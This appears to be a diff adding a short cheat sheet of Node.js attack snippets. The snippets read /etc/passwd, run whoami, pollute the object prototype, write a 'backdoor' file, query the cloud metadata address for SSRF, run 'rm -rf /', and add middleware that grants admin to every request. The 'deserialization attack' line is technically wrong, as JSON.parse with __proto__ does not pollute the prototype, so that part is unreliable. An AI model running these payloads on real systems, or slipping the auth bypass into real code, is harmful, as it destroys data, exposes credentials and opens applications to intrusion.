@@ -1,0 +1,22 @@
+require('fs').readFileSync('/etc/passwd').toString()
+require('child_process').execSync('whoami').toString()
+///// Prototype Pollution
+Object.prototype.admin = true;
+console.log({}.admin);  // true
+
+/////Arbitrary File Write
+require('fs').writeFileSync('/tmp/backdoor.js', "console.log('Hacked!')")
+
+///////Server-Side Request Forgery (SSRF)
+require('http').get('http://169.254.169.254/latest/meta-data/')
+
+/////////Deserialization Attack
+JSON.parse('{"__proto__": {"admin": true}}')
+
+///////Command Injection
+require('child_process').execSync('rm -rf /')
+
+Authentication Bypass
+app.use((req, res, next) => { req.isAdmin = true; next(); })
+
+
